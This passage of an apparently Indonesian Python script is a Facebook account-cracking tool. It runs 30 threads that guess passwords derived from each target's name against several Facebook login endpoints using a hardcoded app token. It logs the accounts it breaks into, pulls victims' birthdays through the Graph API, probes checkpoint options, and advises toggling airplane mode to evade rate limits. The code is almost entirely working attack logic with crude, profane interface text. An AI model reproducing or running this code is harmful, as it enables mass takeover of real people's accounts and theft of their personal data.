		print(f"{H}[•]{I} Pilihan tidak boleh kosong");exit()
	elif fiisayangwidiya in ["1","01"]:
		print(f"{H}[•] Tampilan kan opsi akun chek point {I}Y/t")
		jalan(f"{H}[•]{H} SARAN JANGAN TAMPILKAN BIKIN CRACK LAMA MONYET!!!")
		_checkoptions_=input(f"{H}[•] Pilih : {I}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "anjink"
				key = "anjink" #----- jangan di ubah
				if _key in key:
					print(f"{B} ")
					print(f"{H}[•] Crack menggunakan password manual/default {I}M/D")
					ter =input(f"{H}[•] Pilih : {I}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{H} ")
							print(f"{H} ")
							print(f"{H}[•] Contoh password : {I}sayang,ngentotyuk")
							print(f"{B} ")
							asu = input(f"{B}[•] Buat sandi : {I}").split(",")
							if len(asu) =="":
								print(f"{B} ")
								print(f"{H}[•]{I} Sandi tidak boleh kosong");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(api, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "terserah","kontol","anjing","bangsat','bajingan','jancok" ]
								coeg.submit(api, uid, fii)
						exit()
				else:print(f"{H}[•]{M} Eror");exit()
			except (KeyError,IOError):print(f"{B}[•]{I} Eror");exit()

		else:
			print(f"{H} ")
			print(f"{H}[•] Crack menggunakan password manual/default {I}M/D")
			print(f"{B} ")
			ter =input(f"{H}[•] Pilih : {I}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{H} ")
					print(f"{H} ")
					print(f"{H}[•] Contoh password : {I}sayang,ngentotyuk")
					print(f"{B} ")
					asu = input(f"{B}[•] Buat sandi : {I}").split(",")
					if len(asu) =="":
						print(f"{H} ")
						print(f"{H} ")
						print(f"{H}[•]{I} Sandi tidak boleh kosong")
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(api, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "anjing","bangsat','bajingan','jancok" ]
						coeg.submit(apiiii, uid, fii)
				exit()

	elif fiisayangwidiya in ["3","03"]:
		print(f"{H} ")
		print(f"{H} ")
		print(f"{H}[•] Tampilkan opsi chekpoint {I}Y/T")
		jalan(f"{H}[•]{H} SARAN JANGAN TAMPILKAN BIKIN CRACK LAMA MONYET!!!")
		_checkoptions_=input(f"{H}[•] Pilih : {I}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print(f"{H} ")
					print(f"{H}[•] Crack menggunakan password manual/default {I}M/D")
					ter =input(f"{H}[•] Pilih : {I}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{H} ")
							print(f"{H} ")
							print(f"{H}[•] Contoh password : {I}sayang,ngetotyuk")
							print(f"{H} ")
							asu = input(f"{B}[•] Buat sandi : {I} ").split(",")
							if len(asu) =="":
								print(f"{H} ")
								print(f"{H}[•]{I} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "terserah","kontol","anjing","bangsat','bajingan','jancok" ]
								coeg.submit(mobil, uid, fii)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print(f"{H} ")
			print(f"{H} ")
			print(f"{H}[•] Crack menggunakan pasword manual/defaults {I}M/D")
			ter =input(f"{H}[•] Pilih : {I}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{H} ")
					print(f"{H} ")
					print(f"{H}[•] Contoh password {I}Anjink,sayang,ngentotyuk")
					print(f"{H} ")
					asu = input(f"{H}[•] Buat sandi : {I}").split(",")
					if len(asu) =="":
						print(f"{H} ")
						print(f"{H} ")
						print(f"{H}[•]{K} Sandi tidak boleh kosong KontoL");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "anjing","bangsat','bajingan','jancok" ]
						coeg.submit(mobill, uid, fii)
				exit()
				
	elif fiisayangwidiya in ["2","02"]:
		print(f"{H} ")
		print(f"{H} ")
		print(f"{H}[•] Tampilkan opsi chekpoint {I}Y/T")
		jalan(f"{H}[•]{H} SARAN JANGAN TAMPILKAN BIKIN CRACK LAMA MONYET!!!")
		_checkoptions_=input(f"{H}[•] Pilih : {I}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print(f"{H} ")
					print(f"{H}[•] Crack menggunakan password manual/default {I}M/D")
					ter =input(f"{H}[•] Pilih : {I}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print(f"{B} ")
							print(f"{H}[•] Contoh password : {I}sayang,ngentotyuk")
							print(f"{H} ")
							asu = input(f"{H}[•] Buat sandi : {B} ").split(",")
							if len(asu) =="":
								print(f"{H} ")
								print(f"{H}[•]{K} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "anjing","bangsat','bajingan','jancok" ]
								coeg.submit(mbasic, uid, fii)
						exit()
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print(f"{H} ")
			print(f"{H} ")
			print(f"{H}[•] Crack menggunakan pasword manual/defaults {I}M/D")
			ter =input(f"{H}[•] Pilih : {I}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print(f"{B} ")
					print(f"{B} ")
					print(f"{H}[•] Contoh password {I}Anjink,sayang,ngentotyuk")
					print(f"{H} ")
					asu = input(f"{H}[•] Buat sandi : {I}").split(",")
					if len(asu) =="":
						print(f"{H} ")
						print(f"{H}[•]{K} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"123", frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "anjing","bangsat','bajingan','jancok" ]
						coeg.submit(mbasicc, uid, fii)
				exit()
				
def kone():
    print(f"{B} ")
    print(f"{B} ")
    print(f"{H}[1] B'-Api 《》{I}KONTOL-CEPAT")
    print(f"{H}[2] Mbasic 《》{K}MEMEK-SEDANG")
    print(f"{H}[3] Mobile 《》{H}NGENTOT-PELAN")

def started():
    print(f"{B} ")
    print(f"{B} ")
    print(f"{H}[•]{H} Results {I}ok {H}tersimpan di {I}ok/{tanggal}")
    print(f"{H}[•]{H} Results {K}cp {H}tersimpan di {K}cp/{tanggal}")
    print(f"{H}[•] ON/OFF MODE PESAWAT 5 DETIK SETIAP 500 ID MONYET!!")
    print(f"{B} {I}")

def api(uid, fii):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11"
    global ok, cp, loop, token, cookie
    sys.stdout.write(f"\r{H}[•] |╤►╤► {H} {loop}/{len(id)} {I}OK : {I}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{H} |╤►╤► {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token  = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{H} |╤►╤► {K}{uid}•{pw}•{day} {month} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            cek_log(uid,pw,ua)
            print(f"\r{I} |╤►╤► {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def apiiii(uid, fii):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11"
    global ok, cp, loop, token, cookie

    sys.stdout.write(f"\r{H}[•] |╤►╤► {H} {loop}/{len(id)} {I}OK : {I}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{I} |╤►╤► {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token  = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{I} |╤►╤► {K}{uid}•{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.json%"(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(f"\r{I} |╤►╤► {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def mbasic(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{H}[•] |╤►╤► {H} {loop}/{len(id)} {I}OK : {I}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |╤►╤► {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{H} |╤►╤► {I}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{H} |╤►╤► {I}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasicc(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{H}[•] |╤►╤► {H} {loop}/{len(id)} {I}OK : {I}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{I} |╤►╤► {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{H} |╤►╤► {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{H} |╤►╤► {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mobil(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{H}[•] |╤►╤► {H} {loop}/{len(id)} {I}OK : {I}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mobile.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{H} |╤►╤► {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{H} |╤►╤► {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{H} |╤►╤► {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobill(uid, fii):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{H}[•] ╤►╤► {H} {loop}/{len(id)} {I}OK : {I}{len(ok)} {K}CP : {K}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{H} |╤►╤► {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token  = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{H} |╤►╤► {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{H} |╤►╤► {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def cek_log(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		tempek = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in tempek.find_all("option")]
		print(f"\r{H}[•]{K}╤►╤► {I}{uid}•{pw}")
		for opt in range(len(ngew)):
			jalan(f"{U}[{B}{str(opt+1)}{U}]{I}╤►╤►╤► {U}[{B}{ngew[opt]}{U}")
		if "0" in str(len(ngew)):
			jalan(f"{H}[•]{I} Hore akunya tab yesss, silahkan di login ")
	elif "login_error" in str(run):
